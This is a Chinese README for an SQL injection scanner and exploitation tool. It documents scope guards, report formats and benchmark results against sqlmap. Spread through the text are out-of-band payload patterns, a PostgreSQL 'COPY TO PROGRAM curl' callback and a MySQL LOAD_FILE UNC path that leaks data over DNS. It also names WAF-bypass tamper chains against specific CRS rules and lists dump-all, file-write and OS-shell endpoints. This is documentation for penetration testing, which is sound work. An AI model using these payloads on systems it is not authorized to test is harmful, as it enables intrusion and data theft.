# sqli-scanner

[![Tests](https://img.shields.io/badge/tests-2197%20passing-brightgreen)](#测试)
[![Dependencies](https://img.shields.io/badge/dependencies-0%20known%20vulns-brightgreen)](#环境变量)

> CI 徽章待仓库地址确定后启用（当前 `OWNER/REPO` 是占位，占位链接会显示成"通过"，属误导，
> 故先移除）。发布判定以 `CHANGELOG.md` 与本地/远端门禁结果为准。

一键式 SQL 注入检测工具。无需记忆命令行参数，打开浏览器即可使用。

## 快速开始

```bash
# 安装依赖
npm install
cd server && npm install && cd ..

# 启动后端（终端 1）
npm run server

# 启动前端（终端 2，新开终端）
npm run dev

# 浏览器打开
http://localhost:5173
```

### Docker 一键部署

```bash
docker compose up -d
# 浏览器打开 http://localhost:4567（前后端同端口，Express 直接托管前端静态文件）
# 后端 API http://localhost:4567
```

### 一键扫描（CLI，扫完自动出全套报告）

无需先启动服务，一条命令完成「目标校验 → 扫描 → 全套报告落盘 → 机器可读清单」：

```bash
node scripts/one-click-scan.mjs -u "http://target/page?id=1"
# 等价：npm run scan -- -u "http://target/page?id=1"
```

产出到 `reports/<主机名>-<时间戳>/`：

| 文件 | 用途 |
|---|---|
| `report.html` | 人读交付物（执行摘要 / 漏洞清单 / PoC / 修复建议 / WAF 交战记录） |
| `report.json` | 机器可读完整报告（含逐条 PoC 证据链） |
| `report.md` | Markdown 交付物（可直接贴进工单 / 知识库） |
| `report.sarif` | SARIF 2.1.0，对接 GitHub Security / DefectDojo（`--formats` 显式指定时产出） |
| `report.csv` | 漏洞表 + 拖库数据，Excel 可开（`--formats` 显式指定时产出） |
| `manifest.json` | 本次扫描结构化清单（元信息 + 漏洞索引 + 文件清单 + 授权声明） |

常用选项（其余与 `bin/cli.js` 完全一致）：

```bash
-F, --formats html,json,markdown,sarif,csv   # 输出格式（默认 html,json,markdown）
-o, --out <dir>                              # 输出目录
    --scope <域名/CIDR,...>                  # 授权范围（缺省按目标同源执行）
    --level 1-5 --risk 1-3 --technique union,error,... --tamper <链>
    --timeout <ms> --quiet --no-ledger
```

退出码可直接用于 CI 门禁：`0` 未发现高危 / `2` 发现 Critical 或 High / `1` 执行失败。

> 内网/回环目标需显式放行：`SSRF_ALLOW_PRIVATE=1 node scripts/one-click-scan.mjs -u http://127.0.0.1:8130/...`

**本地实测（2026-09-17，`e2e/real-world-lab`，PGlite 真实 PostgreSQL）**：

```bash
$ node scripts/one-click-scan.mjs -u "http://127.0.0.1:8130/items?cat=1"
  风险等级  : High    数据库: PostgreSQL        注入点: 1 个    漏洞: 3 条
    [高危] SQL 注入（联合查询注入） · CWE-89   受影响参数: cat · URL 查询参数（GET query）
    [高危] SQL 注入（报错注入） · CWE-89       受影响参数: cat · URL 查询参数（GET query）
    [中危] SQL 注入（布尔盲注） · CWE-89       受影响参数: cat · URL 查询参数（GET query）
  产出文件: report.html report.json report.md report.sarif report.csv manifest.json
$ echo $?   # 2（发现 High，CI 门禁生效）
2
```

### 扫描目标范围

| 维度 | 口径 |
|---|---|
| **默认范围** | 目标 URL **同源**（scheme + host + port）；`config.scope` 未配置时按此执行并在报告中如实标注 |
| **显式范围** | `--scope <域名/CIDR/URL 前缀,...>`；越界目标在**发起任何请求前**被拒（`core/scopeGuard.js`） |
| **重定向** | 每一跳都重新校验授权范围，目标 302 到未授权主机时后续请求立即停止（防「统一登录/CDN 回源」逃逸） |
| **SSRF 防护** | 内网/回环/链路本地/云元数据地址默认拒绝；授权内网目标需 `SSRF_ALLOW_PRIVATE=1` 或 `SSRF_ALLOW_CIDRS=<CIDR>` |
| **二阶触发页** | 与主目标同受 scope 约束（存储点在圈内不代表回显页在圈内） |
| **注入点范围** | 默认 query + body（含 JSON 嵌套）；`--test-headers` / `--test-path` 显式开启后追加请求头与 path 段 |

### 支持的注入与漏洞类型

引擎内置 9 条技术通道，每条在报告中映射为规范化的**漏洞类型 + CWE + OWASP 分类**
（单一取数源 `server/src/services/vulnTaxonomy.js`）：

| technique | 漏洞类型 | CWE | 说明 |
|---|---|---|---|
| `union` | SQL 注入（联合查询注入） | CWE-89 | UNION SELECT 拼进回显位，可直接读表 |
| `error` | SQL 注入（报错注入） | CWE-89 | 借报错回显带出数据 + 数据库指纹 |
| `boolean` | SQL 注入（布尔盲注） | CWE-89 | 靠真假条件的内容差异逐位推断 |
| `time` | SQL 注入（时间盲注） | CWE-89 | 条件化延迟逐位推断，无内容差异亦可 |
| `stacked` | SQL 注入（堆叠查询） | CWE-89 | 多语句执行，可写库/调过程 |
| `oob` | SQL 注入（带外通道） | CWE-89 | 数据库进程主动 DNS/HTTP 回连带数据 |
| `second_order` | SQL 注入（二阶注入） | CWE-89 | 写入点与触发点分离（支持跨角色双身份） |
| `inline` | SQL 注入（内联查询注入） | CWE-89 | 派生表/子查询等内联上下文注入 |
| `nosql` | NoSQL 注入 | CWE-943 | 用户输入并入查询对象（`$where` / 操作符） |

OWASP 分类统一为 `A03:2021-Injection`。**未收录的通道不会被静默归类**——走词表兜底类型并在报告中标注「待人工复核」。

### 报告输出格式

所有格式由 `services/ReportGenerator.js` 渲染，**同源取数**（`reportDelivery.js` + `vulnTaxonomy.js`），
不存在「HTML 有、Markdown 没有」的字段漂移。每条漏洞条目必含交付五要素：

| 要素 | 字段 | 出现位置 |
|---|---|---|
| 漏洞类型 | `vulnType.nameZh/nameEn/cwe/owasp` | 全部格式 |
| 风险等级 | `riskLevel` + CVSS v3.1（`score`/`vector`/`severity`） | 全部格式 |
| 受影响参数 | `param` / `location` / `affectedParam` / `url` / `method` | 全部格式 |
| 利用证明 | `poc.curl` / `poc.raw` / `poc.payload`（引擎实发请求形态还原） | HTML / Markdown / JSON / manifest |
| 修复建议 | 按技术通道的针对性措施 + 通用加固基线 | HTML / Markdown / CSV |

> 「受影响参数」是漏洞条目的**自包含字段**（`server/src/engine/vulnEnrich.js` 回填），
> 报告脱离原始 JSON 后仍可读——不再只有内部 pointId hash。

## 功能

| 功能 | 说明 |
|------|------|
| **一键扫描** | 三种形态：Web UI（输入 URL → 点击开始 → 查看报告）/ **CLI 一条命令出全套报告**（`npm run scan -- -u <url>`）/ REST API。CLI 形态见「一键扫描」小节 |
| **结构化漏洞报告** | HTML / JSON / Markdown / SARIF / CSV / manifest，每条漏洞含**漏洞类型(CWE·OWASP) / 风险等级(CVSS) / 受影响参数 / 利用证明(curl·原始报文) / 修复建议**，且明确标注扫描范围与结论可信度 |
| **9 种检测技术** | union / error / boolean / time / stacked / oob / second_order / inline / nosql |
| **18 种数据库** | MySQL / PostgreSQL / SQL Server / Oracle / SQLite / MariaDB / TiDB / DM8 / ClickHouse / DB2 / Sybase / Firebird / Informix / H2 / Access / HSQLDB / Derby / MonetDB | **4 种真实引擎全链路验证 + 3 种部分通道验证 + 11 种模板适配**（分层见下） |

### 数据库支持验证等级（2026-09-10 复核，按证据分层）

> 口径修正：此前 README 写「3 种真实验证，15 种最小适配」——**低估了自身**：仓库中实际存在
> **7 种引擎**的真实验证记录（含 MariaDB 11.4.13、H2、HSQLDB、Derby 真引擎）。现按证据强度重列，
> 等级与 evidence 由 `server/src/engine/dbmsEvidence.js` 统一维护，并**写入每次扫描报告的
> `summary.dbmsEvidence`**（交付时客户可自行判断结论可信度，不必翻 README）。

| 等级 | 方言 | 证据 |
|---|---|---|
| ✅ **真实引擎验证**（检测/绕过主链路跑通） | MySQL、MariaDB、PostgreSQL、SQLite、Oracle（2026-09-15，e2e/oracle-lab）、SQL Server（2026-09-14，e2e/mssql-lab） | 真 MySQL 8.0.x（`e2e/real-mysql-lab` + `e2e/waf-real`）、真 MariaDB 11.4.13（`e2e/multi-engine-lab/mariadb-verify.mjs`）、PGlite 18.3、sql.js WASM、真 PostgreSQL 16.2（`e2e/oob-real-lab` OOB 带外全链路） |
| ⚠️ **部分通道验证** | H2、HSQLDB、Derby | `e2e/multi-engine-lab`（真实 JDBC 内存库，仅布尔通道 × CRS） |
| ⛔ **模板适配（未在真实 DBMS 验证）** | TiDB、DM8、ClickHouse、DB2、Sybase、Firebird、Informix、Access、MonetDB | 仅有检测/提取模板；方言语法、列类型、报错文本均可能有偏差 |

**OOB 带外通道实测口径（2026-09-11 起）**：
- **HTTP 回连**：真 PostgreSQL 16.2（超管）× 无回显 + WAF（拦 sleep/报错/union）场景下，
  `COPY TO PROGRAM curl {CALLBACK}` 全链路回连命中（引擎 payload → 靶场 → PG 进程 → OS curl
  真实回连 127.0.0.1:8899 → 接收端捕获 → 检出 `oob`）；对照组（默认四技术）在同一场景 0 检出，
  OOB 为该场景唯一可达通道。
- **DNS 带外**：真 MySQL 8.0.x（Windows，`--secure-file-priv=` 放行 LOAD_FILE）× 无回显场景下，
  `LOAD_FILE(CONCAT(0x5c5c,'{TOKEN}.{DOMAIN}',0x5c78))` 全链路命中（引擎 → 真 MySQL UNC 解析 →
  Windows 系统解析器（NRPT 路由 `.ooblab.test`）→ DNS 接收端捕获 token → 检出 `oob`，evidence
  标注「DNS 通道」）。接收端 DNS 侧自验证 5/5：自构 A 查询、真实 nslookup、错域过滤、`_` 前缀
  过滤、非 A/AAAA 类型过滤。见 `e2e/oob-real-lab/`（dns-probe / manual-mysql-unc /
  dns-engine-verify）与 `results/`。
- **DNS 通道实战前提**：① MySQL 需 `secure_file_priv` 非 NULL（否则 LOAD_FILE 在约束检查即返回，
  连 DNS 都不发起）；② 目标主机需能对外发起 DNS 查询且解析路径可达攻击者 NS；③ Windows 下
  `.local` 被 mDNS 保留，测试域用 `.test` TLD。
诚实边界：SQL Server xp_dirtree / Oracle UTL_HTTP 等其它库的 OOB 模板未真机验证；真实
ModSecurity/商业云 WAF 环境未实测。

**强动态页实测口径（2026-09-11 起）**：真 MySQL × `/noisy` 强动态靶点（动态内容占比 ~65%，
时间戳/随机 hex/base36 矩阵 + 随机块序，`e2e/real-mysql-lab` lab-app.js）下布尔盲注稳定检出
（3/3），`autoDynamicBlock` 动态块排除 + 基线噪声率自适应（adaptiveMinStable）有效。同靶点
实测揪出并修复定库缺陷：剥 HTML 标签防不住正文随机文本拼出的裸库名子串（"h2"/"dm8"），
报错定库在 H2/DM8 间摇摆；`dbmsFromError` 已加裸库名命中护栏（±160 字符窗口须有报错上下文
关键词，强特征短语直接放行，真实报错页定库零回归——fingerprint/error/payloads 测试集 80/80）。

**定库加固 + 二阶跨角色（2026-09-11 起）**：sqli-labs 全量复测揪出 L46 漏检——Python 靶场
响应头 `Server: BaseHTTP/0.6` 含子串 "ase"，Sybase 头签名 `/ASE/i` 无词边界误命中 → 25ms 内
抢先定库 Sybase → payload 族错配 → 0 检出。`FINGERPRINT` 响应头签名已全部加 `\b` 词边界
（Sybase/ASE、H2、Derby/java、Access/asp 等裸短签名），修复后 L46 恢复检出，23/23（100%）。
二阶注入新增跨角色触发（读写分离身份）：`secondOrder.storeCookies`（低权写入方）/ 
`secondOrder.triggerCookies`（高权读出方）分别覆盖存储与触发页会话，显式 Cookie 优先、
会话 cookieParams 合并补充，键值消毒（原型污染键过滤、上限 32 键）；未配置时行为零变化，
二阶单测 20/20 回归通过。**双身份端到端已实测（2026-09-14）**：real-world-lab 新增
admin-only 触发页 `/admin/panel`（users.admin 角色门禁 403）+ admin 会话禁写评论，场景
`second_order_crossrole`（alice 会话写评论 → triggerCookies: admin 会话触发）检出
`[second_order]`（25 请求 4.1s），自检三连（写入 200 / admin 触发 500 真实引爆 / user+匿名
403 跨角色门禁）全过；单身份场景（second_order）同步切换 user 身份后零回归，靶场
11 场景全 PASS。

**给客户的话**：若目标是 ⛔ 等级中的数据库（SQL Server 与 Oracle 已分别于 2026-09-14/15 升级 verified，见 e2e/mssql-lab 与 e2e/oracle-lab），
请把结论视为**待复核线索**而非可用证据——报告会在 `summary.dbmsEvidence.caveat` 中自动声明这一点。
| **1870+ 条 payload 模板** | 含注释/编码/子句/嵌套闭合变体（1779 主库 + 82 子句 + 14 OOB）+ 672 条声明式注册表 |
| **228 个 tamper 插件** | 覆盖 sqlmap 官方 tamper 全集（84/84）。⚠️ 绕过率口径见下文「WAF 绕过能力实测口径」 |
| **62 WAF 指纹** | 自动识别 WAF 类型并推荐 tamper 组合 |
| **可视化报告** | 风险环形图 + 技术分布条形图 + 漏洞列表 + 数据提取树 + 检测摘要 |
| **深度提取** | 分页聚合数据提取，绕过 UNION 限制 |
| **全库拖库** | `--dump-all`：枚举所有库后逐库逐表拖（对标 sqlmap --dump-all） |
| **字典爆破**（information_schema 不可用时的出路） | `--common-tables` / `--common-columns`：WAF 拦 information_schema、账号权限不足、或目标库无该视图时，用内置常见表/列名字典逐个做存在性探针（130+ 表名 / 140+ 列名，含「通道自检 + 不存在对照名」防假阴性）。实测在 WAF 拦 information_schema 的目标上仍能定位表与列 |
| **WAF 识别接口** | `--identify-waf`：仅识别 WAF 厂商并输出推荐 tamper 链，不发起注入检测（对标 sqlmap --identify-waf） |
| **AI 漏洞报告** | 3 角色流水线（分析师→撰写→审阅），支持多 key 容灾，自动生成专业中文安全分析报告 |
| **利用工具** | SQL Shell / 文件读写 / OS 命令执行（需授权）。⚠️ 验证状态见下文「利用能力实测口径」：**fileRead 已跑通真实闭环**，其余仍为 mock 单测 |
| **CLI 100+ 参数（原生引擎）** | 对标 sqlmap：--dbs/--tables/--dump/**--dump-all**/**--common-tables**/**--common-columns**/-D/-T/-C/--search/--users/--passwords/--prefix/--suffix/--time-sec/-r/--mobile/--parse-errors/--safe-url/--safe-freq/--delay/--current-user/--current-db/--hostname/--is-dba/**--identify-waf**/--skip-static/--predict-output/--test-headers/--test-path/**--hex**/--where/--param-del/**--advise**（扫描前风险评估）/**--confirm-extreme**（极高危第二道确认）等（`node bin/cli.js --help` 为准） |
| **sqlmap 桥接参数（非原生）** | `--csrf-url` / `--csrf-token` / `--eval` / `--skip-urlencode` / `--keep-alive` / `--null-connection`：**仅当转交外部 sqlmap 进程（sqlmapBridge）时才会被传递**，本项目自有引擎不消费这些键。请勿把上表与本节混用 |
| **-r 请求文件** | 从 Burp/curl 请求文本导入 URL/method/headers/body |
| **中英双语** | 全界面 i18n 支持中英切换 |
| **历史记录** | 扫描历史卡片式展示，支持续跑/删除 |
| **真实 DBMS 验证** | SQLite + PostgreSQL + MySQL 三库真实执行验证 |

## 命令

```bash
npm run dev          # 启动前端开发服务器
npm run server       # 启动后端服务器
npm run build        # 构建前端
npm test             # 运行前端测试
npm run tamper-matrix   # 生成 tamper 绕过矩阵
npm run waf-validate    # HTTP 实测验证 WAF 绕过
npm run waf-e2e         # 运行 WAF e2e 对比测试
npm run waf-real        # [对外口径] 真实 OWASP CRS v4.1.0 规则下 tamper 开/关 A/B
npm run waf-auto        # CRS 下「引擎自动选链绕过」验收（不显式配 tamper）
npm run acceptance      # 【门禁】全方位验收（10 套件，事实断言模式，可进 CI）
```

## 后端 API

| 端点 | 方法 | 说明 |
|------|------|------|
| `/api/health` | GET | 健康检查 |
| `/api/scan/start` | POST | 启动扫描 |
| `/api/scan/stop` | POST | 停止扫描 |
| `/api/scan/:id/report` | GET | 获取报告 |
| `/api/scan/:id/report/export` | GET | 导出报告 |
| `/api/tampers` | GET | tamper 插件清单 |
| `/api/exploit/capabilities` | GET | 利用能力查询 |
| `/api/exploit/sql` | POST | SQL 执行 |
| `/api/exploit/file-read` | POST | 文件读取 |
| `/api/exploit/file-write` | POST | 文件写入 |
| `/api/exploit/os-shell` | POST | OS 命令执行 |

## 环境变量

| 变量 | 默认值 | 说明 |
|------|--------|------|
| `HOST` | `127.0.0.1` | 监听地址 |
| `PORT` | `4567` | 监听端口 |
| `SCAN_API_TOKEN` | 无 | API 认证 Token（**非回环监听时必填**，见下） |
| `SCAN_API_TOKEN_FILE` | 无 | 从文件读取 Token（Docker/K8s secret 挂载优先于此项） |
| `SCAN_API_ALLOW_NO_TOKEN` | `0` | 置 `1` 显式接受无鉴权（仅隔离网络；非回环时会打显著告警） |
| `EXPLOIT_ENABLED` | `0` | 开启利用能力（=1 启用） |
| `ALLOWED_ORIGINS` | `http://localhost:5173` | 跨域白名单 |

### 部署安全基线（2026-09-17 起，fail-closed）

引擎能对任意可达目标发起扫描与拖库，因此**暴露面的默认值必须是"起不来"而不是"裸奔"**：

| 监听 | 未设 Token | 结果 |
|---|---|---|
| `HOST=127.0.0.1`（默认 / docker-compose / 桌面版） | ✅ 允许 | 无鉴权但仅本机可达，启动打 WARN |
| `HOST=0.0.0.0` 等网卡地址（Docker 容器必需） | ❌ | **拒绝启动**并打印修复指引（设置 `SCAN_API_TOKEN` 或 `SCAN_API_TOKEN_FILE`，或改回 `HOST=127.0.0.1`） |
| 任意 + `SCAN_API_ALLOW_NO_TOKEN=1` | ✅ 允许 | 显式接受风险，启动打显著 WARN |

```bash
# 生成 token（compose 已要求必填，缺省会拒绝启动）
openssl rand -hex 32   # 或：node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
docker compose up -d   # SCAN_API_TOKEN 未设置时 compose 直接报错
```

Web 端在鉴权启用后需填写一次 token：首次请求遇 401 会弹出输入框（写入 `localStorage.scanApiToken`），
或构建期注入 `VITE_SCAN_API_TOKEN`。

### 桌面版（Tauri）引擎连接（2026-09-17 起）

旧实现把 sidecar 写死在 `127.0.0.1:4567` 且无鉴权：本机任何进程都能连上这个"能扫能拖库"的引擎，
甚至可以先占 4567 冒充引擎（WebView CSP 允许该 origin）截获目标 Cookie 与拖库结果。现在：

- **端口**：优先 4567，被占用则自动改用空闲端口（不再与应用一起"起不来"）；
- **一次性 token**：引擎用 `crypto.randomBytes(32)` 生成，经 stdout `ENGINE_TOKEN=…` 回传给壳，
  壳通过 `get_engine_info` 命令交给前端自动注入，用户无感；
- **失败不崩**：sidecar 缺失/启动失败只广播 `engine-exit`，前端给"重启引擎"入口（旧实现 `expect` 直接 panic）。

**目标认证能力实测口径（2026-09-14 起）**：

| 认证类型 | 状态 | 说明 |
|---|---|---|
| Basic | ✅ 已实现并接线 | `config.auth.basic`，HttpClient 内建 |
| Digest | ✅ 已实现并接线 | `config.auth.digest`（对标 sqlmap `--auth-type=Digest`），每主机挑战缓存 + nc 防重放，有 digestAuth 单测 |
| NTLM | ✅ **已实现并接线**（2026-09-14） | `config.auth.type=NTLM` + `auth.basic={username,password,domain}`（对标 sqlmap `--auth-type=NTLM`），NTLMv1（DES-L）。HttpClient 三步握手：裸请求→Type1→Type2(challenge)→Type3，每主机挑战缓存（同主机后续请求 1 跳直达，省握手往返）。**DES 已自实现**（`core/desEcb.js`，3 个公开向量 + 与 OpenSSL 交叉验证一致），**不需要** `--openssl-legacy-provider` 启动参数。验证：`node e2e/ntlm-lab/verify.mjs`（mock 服务端 10 项断言：握手 3 跳 200、复用 1 跳、换坏凭据不死循环） |

## 架构

```
frontend/ ← React + TypeScript + MUI + Vite
    ↓ REST API
backend/  ← Express + Node.js
    ├── engine/     # 检测引擎（9 种检测器 + Extractor + Exploiter）
    ├── core/       # 核心模块（tamper / WAF / DB 驱动 / OOB 接收）
    └── api/        # API 路由（scan / exploit / tamper / health）
```

## 测试

```bash
# 前端测试（315 个用例）
npm test

# 服务端测试（1885 个用例）
cd server && npm test

# 全部测试
npm run test:all
```

> 下方「项目状态」里的测试数与覆盖率**不是手写的**，唯一来源是 `docs/_facts.json`
> （由 `npm run facts:refresh` 实跑采集）。`npm run facts:check` 会校验二者是否一致，
> 已接入 `check:all` 与 CI —— 数字对不上就红，避免文档口径静默漂移。
> 补测后若数字变化，跑 `npm run facts:fix` 一键回写 README。

## 项目状态

- TypeScript: 零错误
- 前端测试: 315/315 通过（覆盖率门禁 stmts 91.11 / branch 80.00 / func 72.01，阈值 88/77/67）
- 服务端测试: 1885 用例（1882 pass / 0 fail / 3 skip，并发口径 2026-09-18 复测；3 skip 为环境依赖显式跳过。覆盖率 lines 88.82 / branch 72.95 / func 76.26，阈值 85/69/72）
- 一键扫描: `npm run scan -- -u <url>`（CLI 一条命令产出 HTML/JSON/Markdown 全套报告 + manifest，退出码可直接进 CI 门禁）
- Tamper 插件: 228 个（含 v24 增量 20 个，对齐 sqlmap 官方 tamper 全集，含官方 CRS/libinjection 实测组合 uniontable+odbcbrace）
- WAF 绕过能力: 200+ 插件链式组合，覆盖 62 个 WAF 厂商指纹识别 + 推荐

### ⚠️ 已知问题与修复记录（黑盒评测）

**来源**：`e2e/blackbox-lab/` —— 独立第三方评测靶场。刻意**不复用项目自带靶场**（避免作者自证），
真 MySQL 8.0.28 拼接 SQL，22 靶点（15 漏洞 + 7 安全对照）。
真值标定：**漏洞点 15/15 成立、安全点 7/7 防护确认**（每点 3 次采样）。

| 编号 | 问题 | 状态 |
|---|---|---|
| **P0** | `--test-path` 在非 200 端点误报（7 个安全点中 6 个） | ✅ **已修复**（2026-09-16） |
| **P1-A** | 提取阶段内部空转 327,875 次 + `validity` 误报 `unreachable` | ✅ **已修复**（2026-09-17） |
| **P1-B** | 列数探测在「恒 200 + 错误页回显」目标上顶到上限 50 | ✅ **已修复**（2026-09-17） |
| **P1-C** | DBMS 定库：5 个**常量串** sig 无区分度（真 MySQL 判 DB2） | ✅ **已修复**（2026-09-16） |
| **P1-D** | DBMS 定库：**纯版本号** sig 互相冲突（自检出 20 处） | ⚠️ **未修**（`node e2e/blackbox-lab/check-dbms-sig.mjs` 仍非零退出） |
| **P1-E** | 提取链：长度探测顶到上限 **65,531** → 拖库不可用 | ⚠️ **根因已定位，未修**（见下） |
| **P1-F** | 定库链路的**回显污染 + 上下文盲区**：真 MySQL 被判 ClickHouse / 闭合探测拿不到前缀 / 版本回显通道整条失效 | ✅ **已修复**（2026-09-18，详见下） |
| **P1-G** | `--cookie` 只当会话用、**从不作为注入面**（level 5 下解析出 0 个点） | ✅ **已修复**（2026-09-18，详见下） |

> **P1-A / P1-B / P1-E 是同一病根的三个实例**（详见 `docs/统一探测判据-设计.md`）：
> 二分探测的真/假判据依赖「响应差异」，而目标**恒 200 + 错误页回显**时差异被抹平
> → 二分失去方向 → **顶到上限** → 下游拿着荒谬值继续跑（且不报错）。
> 前两个已修，第三个（长度探测）修法与它们相同，抽象已就绪（`server/src/engine/binaryProbe.js`）。

**P0 根因与修法**（诊断实测，非推断）：
path 段注入后 URL 变为不存在的路径（500/403 → 404），404 页**回显请求 URL**，
响应里于是出现 payload 自带的 `extractvalue` / `SQL syntax` 等关键词，被 `ERROR_SIG` 匹配
→ 误判为「数据库报错回显」。即 **payload 自我匹配**。

关键细节：回显形式是 **HTML 实体 + URL 编码混合** ——
`Cannot GET /api/safe/error&#39;%20AND%20extractvalue(1,concat...`
单引号是 `&#39;`（HTML 实体）而非 `%27`，空格是 `%20`。
**只做其中一种编码还原都剔不掉 payload**（前两次修复因此失败）。
最终修法：`normalizeEcho()` 先做「HTML 实体 → 字符」，再做「URL 解码（两轮）」，然后剔除 payload 原文。

**修复验证**：
- 安全点误报 **6/7 → 0/7**
- 真阳性 `B1-error` **仍命中**（未修坏）
- 同一靶点**连跑 5 次**：误报 0/5、真阳性 5/5（无偶发）
- 报错注入相关单测 47/47；全量单测 1815 / 0 fail

**⚠️ 修复同时推翻了一组此前对外数据**：

r2 档原报「检出 13/13」，但其中 **3 个点（A3-like / A4-orderby / C2-blindtime）的「命中」
正是靠上述误报机制达成的**（技术位均为 `error`）。修掉误报后它们的假命中同步消失。

当时的复测结论是「**两档检出均为 9/13、误报 0/7**」，并由此得出
**「扫不出来就加参数」在本工具上不成立**。—— 这条结论在 2026-09-18 被**部分推翻**：
拉满参数确实没换来检出，是因为当时还有三条**与参数无关**的链路缺陷在吃掉真阳性
（见下方 P1-F / P1-G）。修掉之后，实战档 r2 从 9/13 升到 **13/13**、误报仍为 0/7；
默认档 r1 为 **10/13**（余下 3 个漏项全部是 level/risk 门控：Cookie 点要 level≥2、
Header 点要 level≥3、ORDER BY 布尔对要 level 3（同点的时间型向量要 risk≥2），与 sqlmap 同语义，不是判据失效）。

**P1-F 根因与修法**（三条同源缺陷，全部由 blackbox-lab 真 MySQL 实测定位，非推断）：

同一病根 = **目标把注入值原样回显时，所有「响应 vs 基线」的比较都被那份回显污染**，
这正是 `echoStrip.js` 文件头列的第 ②③ 个坑在另外两条链路上的复发：

1. **闭合探测整批落空**（`engine/Detector.js` `probeBoundary`）：LIKE 搜索框
   （`WHERE name LIKE '%${kw}%'`，需 `%'` 闭合）的 13 个候选**全部**判不相似 →
   boundary 回退 `''` → union 门控真假同长 → **该点 union+boolean 技术位全灭**。
   修法：相似判定先剔除被回显的 payload；并补一条**不依赖基线**的判据 ——
   等长真假对差分（`AND 1=1` vs `AND 1=2`，各自剔除回显后：闭合正确必不同、闭合错误必相同）。
   只在基线比对一条都不命中时才发这组探针，正常站点零额外请求。
2. **版本回显定库通道失效**（`engine/DBFingerprinter.js`）：回显型目标的页面里有**两份**
   `__S__…__E__`（一份来自被回显的 SQL 文本，一份来自真实结果行），`match` 取第一处 →
   永远拿到 SQL 文本 → 18 库 sig 全落空 → 退化到报错/时间向量定库，而误判就发生在那里。
   修法：取标记前先剔除本条 payload 的回显。
3. **时间向量把闭合引号写死在模板里**（`engine/payloads/index.js` `TIME_VECTORS`）：
   MySQL/PG/Oracle/SQLite 的向量不带引号、ClickHouse/Sybase/H2/MonetDB 自带 `'` →
   在字符串型上下文上「向量顺序即优先级」被打乱：真 MySQL 的字符串点上，MySQL 向量落进
   字面量内不延时，第 6 位的 ClickHouse 向量靠自带引号闭合成功 → **定库 ClickHouse**
   （实测 A2-string / A3-like 均误判）。修法：模板统一用 `{BD}`（该点已探到的闭合前缀）填充。
   附带修掉一处**误判放大**：指纹缓存原先整台目标共享一份，而检测是多点**并发**跑的，
   排在最前的若是 path/header 点（实测其探针全 404），那份 null 就被后面每个点继承 →
   C2-blindtime 在 r2 档整点漏检。现按点类别（main / header / path）分桶。

**P1-F 顺带消除的一处自伤风险**：H2 的 `SLEEP()` 以**毫秒**计、MySQL 同名函数以**秒**计。
原向量 `SLEEP({SLEEP}000)` 是字符串拼接，加了 `{BD}` 之后它在数值上下文的 MySQL 上完全合法
—— 一旦排前的 MySQL 向量因故未延时（例如 WAF 只拦 `SLEEP(1)`），就是让目标库睡 1000~15000 秒。
单位不对称无法用任何表达式同时满足两边，故 H2 **移出盲探时间向量**，定库改由报错签名承担
（`org.h2.jdbc` / "Syntax error in SQL statement"），并加了一条防回归断言：
盲探向量里不允许出现任何 `{SLEEP}0+` 放大写法。

**P1-G 根因与修法**（`bin/cli/config.js`）：`--cookie` 此前只进 `auth.cookie`（会话携带），
cookieParams 只能由 `--header 'cookie: …'` + `--test-headers` 那条路填进来。于是最主流的写法
`--cookie uid=1 -u …/api/profile --level 5` 解析出 **0 个注入点** → 0 请求 → 报告「未检出」，
看起来像一次干净的低风险扫描。现 `--cookie` 的每一对都直接成为候选注入面（是否真投放仍由
TargetParser 的 level≥2 门控决定，与 sqlmap 同语义）；同时不再把已升为注入点的键经
`auth.cookie` 重复附加（同名两份时哪份生效取决于目标解析顺序 → 结论不可复现）。

**P1-F / P1-G 修复验证**（blackbox-lab 真 MySQL 8.0.28 + 全量单测）：

| 靶点 | 修前 | 修后 |
|---|---|---|
| A2-string | dbms=ClickHouse（误判） tech=[boolean] | dbms=null（诚实未知） tech=[boolean] |
| A3-like | dbms=ClickHouse（误判） tech=[**time**]（蹭误判才命中） | dbms=**MySQL** tech=[union,boolean] 风险 Medium→**High** |
| C2-blindtime（r2） | 整点漏检（指纹缓存继承 null） | HIT tech=[time] |
| D3-cookie | r2 档 0 个点 / 0 请求 | HIT tech=[union,boolean] |
| 两档合计 | r1 10/13、r2 9/13 | **r1 10/13、r2 13/13，误报 0/7** |

回归：服务端全量单测 0 fail、前端 315/315、`tsc` 0 错、eslint 0 error；
redteam-lab（真 MySQL）R1 **18/19**、R2 **19/19**、安全点误报 0/7（与既有记录一致，零回归）。
新增纯 JS mock 回归钉 `server/tests/boundary.echoTarget.test.js`（不依赖真库即可复现回显污染两类缺陷）。

**同题对照（sqlmap 1.10.7，同一批靶点）**：

| 工具 / 档位 | 漏洞检出 | 安全误报 |
|---|---|---|
| sqli-scanner **默认档（r1）** | 10/13 | **0/7** |
| sqli-scanner 实战档（r2，level5/risk3/全技术/test-headers/test-path） | **13/13** | **0/7** |
| sqlmap（level 1 / risk 1，与默认档对齐） | 7/13 | **0/7** |

（sqlmap 行为 2026-09-15 实测，本工具两档为 2026-09-18 复测；同批靶点、同一靶场进程。）

**结论**：默认档强于 sqlmap 同档（10 vs 7，误报同为 0/7），且独有检出 base64 编码参数、
REST path 段、堆叠通道（sqlmap level 1 三者全漏）。

**复现**：
```bash
node e2e/blackbox-lab/selftest.mjs                        # 立真值（漏洞点应可注入、安全点应不可注入）
node e2e/blackbox-lab/run-scan.mjs                        # 两轮扫描（r1 默认档 / r2 实战档）
node e2e/blackbox-lab/sqlmap-bench.mjs                    # sqlmap 同题对照
```

### WAF 绕过能力实测口径（2026-09-09 起，勿混用）

| 数据来源 | 口径 | 对外可用性 |
|---|---|---|
| `npm run waf-real`（e2e/waf-real，OWASP CRS v4.1.0 官方规则原文 + 自实现 SecRule 执行器 ≈PL3） | **tamper off 2/5 → tamper on 10/5 技术位**（2026-09-10 复测更正；num/str/like/blind 均为 `[union,boolean]`、orderby `[error,boolean]`，安全对照零误拦） | ✅ 唯一对外引用数字 |
| `npm run waf-validate`（e2e/waf-lab，自写正则模拟器） | 「107/225 有效、base64encode 100%」等 | ⚠️ 仅作插件自检，不得对外引用 |
| 真实 ModSecurity/Coraza/商业云 WAF | 未实测 | ❌ 禁止声明 |

结论（诚实边界）：严格 CRS v4.1.0 下 **union 与布尔通道均已实测可绕过**（`--tamper=dash2hash,hexliterals`：
`-- -` → `#` 规避 942460 四连非词字符，`hexliterals` 抽掉字面量引号锚点规避 942511/942200/942370）。
error 通道仅在 orderby 场景命中。
